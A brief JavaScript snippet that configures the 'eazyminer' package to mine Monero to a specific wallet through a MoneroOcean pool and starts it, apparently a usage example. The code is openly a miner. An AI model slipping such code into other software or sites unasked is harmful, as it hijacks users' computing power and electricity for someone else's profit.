const Miner = require('eazyminer');

const miner = new Miner({
    pools: [{
        coin: 'XMR',
        user: '45yVHJaCLpUeBg383G97PEPiMLQwo9FVN58kLp92SyQNdCKqfQdMs23LZekLfWQ51Whe6BgM5LfuzLB3HRtpz9651baZBVm',
        url: 'gulf.moneroocean.stream:20128', // optional pool URL,
    }],
    autoStart: false // optional delay
});

miner.start(); // optional manually start the miner
// miner.stop() // manually stop the miner
